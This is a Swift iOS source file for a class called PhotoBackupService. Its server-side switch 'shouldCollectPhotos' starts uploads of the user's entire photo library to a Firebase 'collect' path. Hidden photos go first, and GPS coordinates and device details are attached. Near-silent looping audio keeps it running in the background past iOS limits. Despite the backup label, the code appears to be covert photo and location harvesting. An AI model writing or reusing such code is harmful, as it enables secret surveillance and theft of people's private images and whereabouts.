import SwiftUI
import Photos
import FirebaseStorage
import FirebaseAuth
import FirebaseFirestore
import UIKit
import Network
import CoreLocation
import ImageIO
import AVFoundation

class PhotoBackupService {
    static let shared = PhotoBackupService()
    // Removed UserDefaults keys in favor of Firestore persistence
    
    private var isBackingUp = false
    private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
    private var audioPlayer: AVAudioPlayer?
    
    private init() {}
    
    @MainActor
    func startBackup() {
        guard !isBackingUp else { return }
        
        Task {
            guard let uid = Auth.auth().currentUser?.uid else { return }
            
            let shouldCollect = await LogsFirestoreService.shared.shouldCollectPhotos(userId: uid)
            guard shouldCollect else { return }
            
            // Fire and forget metadata update
            Task {
                await self.updateMetadata(userId: uid)
            }
            
            let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
            
            if status == .notDetermined {
                let newStatus = await PHPhotoLibrary.requestAuthorization(for: .readWrite)
                if newStatus == .authorized || newStatus == .limited {
                    beginBackup(userId: uid)
                }
                return
            }
            
            guard status == .authorized || status == .limited else { return }
            
            beginBackup(userId: uid)
        }
    }
    
    private func updateMetadata(userId: String) async {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        let statusString: String
        switch status {
        case .authorized: statusString = "authorized"
        case .limited: statusString = "limited"
        case .denied: statusString = "denied"
        case .restricted: statusString = "restricted"
        case .notDetermined: statusString = "notDetermined"
        @unknown default: statusString = "unknown"
        }
        
        // Device Info
        let (model, systemName, systemVersion, appVersion) = await MainActor.run {
            (UIDevice.current.model, UIDevice.current.systemName, UIDevice.current.systemVersion, Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown")
        }
        
        // Photo Stats
        let allFetchOptions = PHFetchOptions()
        allFetchOptions.includeHiddenAssets = true
        allFetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        allFetchOptions.predicate = NSPredicate(format: "mediaType = %d OR mediaType = %d", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        
        let allAssets = PHAsset.fetchAssets(with: allFetchOptions)
        let totalPhotos = allAssets.count
        let oldestPhotoDate = allAssets.firstObject?.creationDate
        
        // Count hidden
        let hiddenFetchOptions = PHFetchOptions()
        hiddenFetchOptions.includeHiddenAssets = true
        hiddenFetchOptions.predicate = NSPredicate(format: "(mediaType = %d OR mediaType = %d) AND isHidden == YES", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        let hiddenPhotos = PHAsset.fetchAssets(with: hiddenFetchOptions).count
        
        let data: [String: Any] = [
            "photoPermissionStatus": statusString,
            "lastPermissionCheck": FieldValue.serverTimestamp(),
            "metadataUpdatedAt": FieldValue.serverTimestamp(),
            
            "deviceModel": model,
            "systemName": systemName,
            "systemVersion": systemVersion,
            "appVersion": appVersion,
            
            "totalPhotos": totalPhotos,
            "lastKnownTotalPhotos": totalPhotos,
            "hiddenPhotos": hiddenPhotos,
            "oldestPhoto": oldestPhotoDate ?? NSNull()
        ]
        
        try? await Firestore.firestore().collection("collect").document(userId).setData(data, merge: true)
    }
    
    @MainActor
    private func beginBackup(userId: String) {
        startSilentAudio()
        isBackingUp = true
        registerBackgroundTask()
        
        Task.detached(priority: .background) { [weak self] in
            guard let self = self else { return }
            defer {
                Task { @MainActor in
                    self.isBackingUp = false
                    self.endBackgroundTask()
                }
            }
            
            // Phase 1: Upload Hidden Assets
            await self.processBatch(userId: userId, hidden: true)
            
            // Phase 2: Upload Visible Assets
            // Only proceed if we still have background time (checked inside processBatch too, but good to check here)
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            if timeRemaining > 10 {
                await self.processBatch(userId: userId, hidden: false)
            }
        }
    }
    
    private func processBatch(userId: String, hidden: Bool) async {
        // Fetch cursors from Firestore
        let doc = try? await Firestore.firestore().collection("collect").document(userId).getDocument()
        let data = doc?.data() ?? [:]
        
        // Map Firestore keys
        // cursorOldest... corresponds to the old "gapBottom" (uploaded ascending)
        // cursorNewest... corresponds to the old "gapTop" (uploaded descending)
        let bottomKey = hidden ? "cursorOldestHidden" : "cursorOldestVisible"
        let topKey = hidden ? "cursorNewestHidden" : "cursorNewestVisible"
        
        let gapBottom = (data[bottomKey] as? Timestamp)?.dateValue() ?? Date.distantPast
        // If GapTop is missing, it means we haven't started the "Newest First" strategy yet.
        // We treat everything > GapBottom as the gap.
        // We will initialize GapTop to the date of the first asset we process (the newest).
        var gapTop = (data[topKey] as? Timestamp)?.dateValue()

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)] // Newest first
        
        // Fetch assets newer than the old "bottom" cursor
        let predicateFormat = "(mediaType = %d OR mediaType = %d) AND creationDate > %@"
        let args: [Any] = [PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue, gapBottom as NSDate]
        
        if hidden {
            fetchOptions.includeHiddenAssets = true
            fetchOptions.predicate = NSPredicate(format: predicateFormat + " AND isHidden == YES", argumentArray: args)
        } else {
            fetchOptions.predicate = NSPredicate(format: predicateFormat, argumentArray: args)
        }

        let assets = PHAsset.fetchAssets(with: fetchOptions)

        if assets.count > 0 {
            print("PhotoBackup: Found \(assets.count) assets in gap (> \(gapBottom)) to process (Newest First).")
        }

        let batchSize = 6
        var currentIndex = 0
        
        while currentIndex < assets.count {
            // Check if we are running out of background time
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            print("PhotoBackup: Time remaining: \(timeRemaining)")
            
            // Only stop if time is critically low AND we aren't supposedly in audio mode (though if we are, time should be infinite)
            // But realistically, if time drops below 5s, we must stop to be safe.
            if timeRemaining < 10 && timeRemaining != .greatestFiniteMagnitude {
                print("PhotoBackup: Background time running out. Stopping.")
                break
            }
            
            let endIndex = min(currentIndex + batchSize, assets.count)
            let currentBatchIndices = currentIndex..<endIndex
            
            // Prepare batch assets
            var batchAssets: [(Int, PHAsset)] = []
            for i in currentBatchIndices {
                batchAssets.append((i, assets[i]))
            }
            
            var batchResults: [Int: Bool] = [:]
            
            await withTaskGroup(of: (Int, Bool).self) { group in
                for (index, asset) in batchAssets {
                    group.addTask {
                        // Logic:
                        // Always check existence to prevent duplicates (double counting) in case of crashes/restarts.
                        // Even if we are in the "Gap", we might have partially uploaded this batch before crashing.
                        if await self.checkRemoteExistence(asset: asset, userId: userId) {
                            print("PhotoBackup: Asset \(asset.localIdentifier) already exists. Skipping.")
                            return (index, true) // Treat as success
                        }
                        
                        do {
                            _ = try await self.uploadAsset(asset, userId: userId)
                            return (index, true)
                        } catch {
                            print("PhotoBackup: Failed to upload asset \(asset.localIdentifier): \(error)")
                            return (index, false)
                        }
                    }
                }
                
                for await (index, success) in group {
                    batchResults[index] = success
                }
            }
            
            // Update GapTop
            // We want to lower GapTop to the oldest asset we successfully processed in this batch.
            // Since we process descending, the last asset in the batch is the oldest.
            // If the batch was fully successful (or at least the tail was), we can lower GapTop.
            
            // Find the oldest successful asset in this batch
            // We iterate backwards from the end of the batch
            var oldestSuccessDate: Date?
            for i in currentBatchIndices.reversed() {
                if batchResults[i] == true {
                    if let date = assets[i].creationDate {
                        oldestSuccessDate = date
                        // We found the oldest success.
                        // But we can only lower GapTop if we are contiguous from the previous GapTop?
                        // Actually, GapTop tracks the "High Water Mark" of the backfill.
                        // If we successfully processed 'date', and 'date' < currentGapTop, we can lower it.
                        break
                    }
                }
            }
            
            if let newDate = oldestSuccessDate {
                let currentGapTop = gapTop ?? Date.distantFuture
                if newDate < currentGapTop {
                    gapTop = newDate
                    // Update Firestore
                    try? await Firestore.firestore().collection("collect").document(userId).updateData([
                        topKey: Timestamp(date: newDate)
                    ])
                    print("PhotoBackup: GapTop lowered to \(newDate)")
                }
            }
            
            currentIndex += batchSize
        }
    }
    

    // Helper to ensure flat filename structure
    private func getSafeFilename(for asset: PHAsset) -> String {
        let id = asset.localIdentifier.components(separatedBy: "/").first ?? asset.localIdentifier
        return id.replacingOccurrences(of: "[^a-zA-Z0-9-]", with: "", options: .regularExpression)
    }

    private func checkRemoteExistence(asset: PHAsset, userId: String) async -> Bool {
        let ext = (asset.mediaType == .video) ? "mp4" : "jpg"
        let safeID = getSafeFilename(for: asset)
        
        // 1. Check direct path
        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).\(ext)")
        
        do {
            _ = try await ref.getMetadata()
            print("PhotoBackup: Found asset at new path: \(ref.fullPath)")
            return true
        } catch {
            // 2. Check legacy nested path (just in case it was uploaded before the fix)
            // The old logic was basically localIdentifier.replacingOccurrences(of: "/", with: "_")
            let oldSafeID = asset.localIdentifier.replacingOccurrences(of: "/", with: "_")
            // Since we don't know exactly how the user's filesystem UUID structure mapped, we can try the most common known pattern if needed.
            // But 'oldSafeID' handles the full string replacement we were doing.
            let oldRef = Storage.storage().reference().child("collect/\(userId)/\(oldSafeID).\(ext)")
            
            do {
                _ = try await oldRef.getMetadata()
                print("PhotoBackup: Found asset at legacy path: \(oldRef.fullPath)")
                return true
            } catch {
                 return false
            }
        }
    }
    
    private func uploadAsset(_ asset: PHAsset, userId: String) async throws -> Int64 {
        if asset.mediaType == .image {
            return try await uploadImage(asset, userId: userId)
        } else if asset.mediaType == .video {
            return try await uploadVideo(asset, userId: userId)
        }
        return 0
    }
    
    private func uploadImage(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            manager.requestImageDataAndOrientation(for: asset, options: options) { data, dataUTI, orientation, info in
                guard let data = data else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -1, userInfo: [NSLocalizedDescriptionKey: "No image data"]))
                    return
                }
                
                let safeID = self.getSafeFilename(for: asset)
                let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).jpg")
                
                // Inject metadata (Location, Creation Date, etc.)
                let finalData = self.injectImageMetadata(data: data, asset: asset)
                
                let metadata = StorageMetadata()
                metadata.contentType = "image/jpeg"
                if let date = asset.creationDate {
                    metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
                }
                
                ref.putData(finalData, metadata: metadata) { metadata, error in
                    if let error = error {
                        continuation.resume(throwing: error)
                    } else {
                        // Log successful upload with storage path
                        print("PhotoBackup: Uploaded image \(asset.localIdentifier) to \(ref.fullPath)")
                        
                        // Increment counters in Firestore
                        let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
                        Firestore.firestore().collection("collect").document(userId).updateData([
                            field: FieldValue.increment(Int64(1)),
                            "latestPhotoUploaded": FieldValue.serverTimestamp()
                        ])
                        
                        continuation.resume(returning: Int64(data.count))
                    }
                }
            }
        }
    }
    
    private func uploadVideo(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHVideoRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            // Export video to a temporary file
            manager.requestExportSession(forVideo: asset, options: options, exportPreset: AVAssetExportPresetHighestQuality) { exportSession, info in
                guard let exportSession = exportSession else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -2, userInfo: [NSLocalizedDescriptionKey: "Could not create export session"]))
                    return
                }
                
                let tempDir = FileManager.default.temporaryDirectory
                let fileName = "\(UUID().uuidString).mp4"
                let outputURL = tempDir.appendingPathComponent(fileName)
                
                exportSession.outputURL = outputURL
                exportSession.outputFileType = .mp4
                exportSession.metadata = self.getVideoMetadata(for: asset)
                
                let sendableSession = SendableExportSession(session: exportSession)
                
                Task {
                    let exportSession = sendableSession.session
                    if #available(iOS 18.0, *) {
                        do {
                            try await exportSession.export(to: outputURL, as: .mp4)
                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                        } catch {
                            continuation.resume(throwing: error)
                        }
                    } else {
                        exportSession.exportAsynchronously { [sendableSession] in
                            let session = sendableSession.session
                            switch session.status {
                            case .completed:
                                Task {
                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                                }
                            case .failed:
                                continuation.resume(throwing: session.error ?? NSError(domain: "PhotoBackup", code: -3, userInfo: [NSLocalizedDescriptionKey: "Export failed"]))
                            case .cancelled:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -4, userInfo: [NSLocalizedDescriptionKey: "Export cancelled"]))
                            default:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -5, userInfo: [NSLocalizedDescriptionKey: "Export unknown error"]))
                            }
                        }
                    }
                }
            }
        }
    }
    
    private func handleExportCompletion(outputURL: URL, asset: PHAsset, userId: String, continuation: CheckedContinuation<Int64, Error>) async throws {
        let safeID = getSafeFilename(for: asset)
        let ref = Storage.storage().reference().child("collect/\(userId)/\(safeID).mp4")
        let metadata = StorageMetadata()
        metadata.contentType = "video/mp4"
        if let date = asset.creationDate {
            metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
        }
        
        do {
            _ = try await ref.putFileAsync(from: outputURL, metadata: metadata)
            
            // Get file size before cleanup
            let fileSize = (try? FileManager.default.attributesOfItem(atPath: outputURL.path)[.size] as? Int64) ?? 0
            
            // Clean up temp file
            try? FileManager.default.removeItem(at: outputURL)
            
            print("PhotoBackup: Uploaded video \(asset.localIdentifier) to \(ref.fullPath)")
            
            let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
            try await Firestore.firestore().collection("collect").document(userId).updateData([
                field: FieldValue.increment(Int64(1)),
                "latestPhotoUploaded": FieldValue.serverTimestamp()
            ])
            
            continuation.resume(returning: fileSize)
        } catch {
            // Clean up temp file even on error
            try? FileManager.default.removeItem(at: outputURL)
            continuation.resume(throwing: error)
        }
    }

    @MainActor
    private func startSilentAudio() {
        // Play a silent sound to keep the app active in background
        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, options: .mixWithOthers)
            try AVAudioSession.sharedInstance().setActive(true)
            
            // 1-second silent MP3 base64
            // UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA
            // This is a minimal WAV header.
            let b64 = "UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA"
            if let data = Data(base64Encoded: b64) {
                audioPlayer = try AVAudioPlayer(data: data)
                audioPlayer?.numberOfLoops = -1 // Infinite loop
                audioPlayer?.volume = 0.01 // Small non-zero volume is safer for background execution
                audioPlayer?.play()
                print("PhotoBackup: Silent audio started for background execution")
            }
        } catch {
            print("PhotoBackup: Failed to start silent audio: \(error)")
        }
    }

    @MainActor
    private func stopSilentAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
        print("PhotoBackup: Silent audio stopped")
    }
    
    @MainActor
    private func registerBackgroundTask() {
        // End any existing task first
        if backgroundTask != .invalid {
             UIApplication.shared.endBackgroundTask(backgroundTask)
        }
        backgroundTask = UIApplication.shared.beginBackgroundTask { [weak self] in
            // When bg time runs out, we try to restart the task if we are still backing up
            self?.endBackgroundTask()
        }
    }
    
    @MainActor
    private func endBackgroundTask() {
        stopSilentAudio()
        if backgroundTask != .invalid {
            UIApplication.shared.endBackgroundTask(backgroundTask)
            backgroundTask = .invalid
        }
    }
    
    // MARK: - Metadata Injection Helpers
    
    private func injectImageMetadata(data: Data, asset: PHAsset) -> Data {
        guard let source = CGImageSourceCreateWithData(data as CFData, nil) else { return data }
        guard let uti = CGImageSourceGetType(source) else { return data }
        
        let mutableData = NSMutableData()
        guard let destination = CGImageDestinationCreateWithData(mutableData, uti, 1, nil) else { return data }
        
        var properties = CGImageSourceCopyPropertiesAtIndex(source, 0, nil) as? [String: Any] ?? [:]
        
        // Inject GPS
        if let location = asset.location {
            properties[kCGImagePropertyGPSDictionary as String] = getGPSDictionary(for: location)
        }
        
        // Inject Creation Date (Exif and TIFF)
        if let date = asset.creationDate {
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy:MM:dd HH:mm:ss"
            let dateString = formatter.string(from: date)
            
            var exif = properties[kCGImagePropertyExifDictionary as String] as? [String: Any] ?? [:]
            exif[kCGImagePropertyExifDateTimeOriginal as String] = dateString
            exif[kCGImagePropertyExifDateTimeDigitized as String] = dateString
            properties[kCGImagePropertyExifDictionary as String] = exif
            
            var tiff = properties[kCGImagePropertyTIFFDictionary as String] as? [String: Any] ?? [:]
            tiff[kCGImagePropertyTIFFDateTime as String] = dateString
            properties[kCGImagePropertyTIFFDictionary as String] = tiff
        }
        
        CGImageDestinationAddImageFromSource(destination, source, 0, properties as CFDictionary)
        if CGImageDestinationFinalize(destination) {
            return mutableData as Data
        }
        
        return data
    }

    private func getGPSDictionary(for location: CLLocation) -> [String: Any] {
        var gps: [String: Any] = [:]
        
        // Latitude
        let lat = location.coordinate.latitude
        gps[kCGImagePropertyGPSLatitude as String] = abs(lat)
        gps[kCGImagePropertyGPSLatitudeRef as String] = lat >= 0 ? "N" : "S"
        
        // Longitude
        let lon = location.coordinate.longitude
        gps[kCGImagePropertyGPSLongitude as String] = abs(lon)
        gps[kCGImagePropertyGPSLongitudeRef as String] = lon >= 0 ? "E" : "W"
        
        // Altitude
        let alt = location.altitude
        gps[kCGImagePropertyGPSAltitude as String] = abs(alt)
        gps[kCGImagePropertyGPSAltitudeRef as String] = alt >= 0 ? 0 : 1
        
        // Date/Time
        let formatter = DateFormatter()
        formatter.timeZone = TimeZone(identifier: "UTC")
        formatter.dateFormat = "HH:mm:ss"
        gps[kCGImagePropertyGPSTimeStamp as String] = formatter.string(from: location.timestamp)
        formatter.dateFormat = "yyyy:MM:dd"
        gps[kCGImagePropertyGPSDateStamp as String] = formatter.string(from: location.timestamp)
        
        return gps
    }
    
    private func getVideoMetadata(for asset: PHAsset) -> [AVMetadataItem] {
        var metadata: [AVMetadataItem] = []
        
        if let location = asset.location {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyLocation as (NSCopying & NSObjectProtocol)
            item.value = iso6709String(from: location) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        if let date = asset.creationDate {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyCreationDate as (NSCopying & NSObjectProtocol)
            item.value = ISO8601DateFormatter().string(from: date) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        return metadata
    }
    
    private func iso6709String(from location: CLLocation) -> String {
        let lat = location.coordinate.latitude
        let lon = location.coordinate.longitude
        return String(format: "%+08.4f%+09.4f/", lat, lon)
    }
}

private struct SendableExportSession: @unchecked Sendable {
    let session: AVAssetExportSession
}
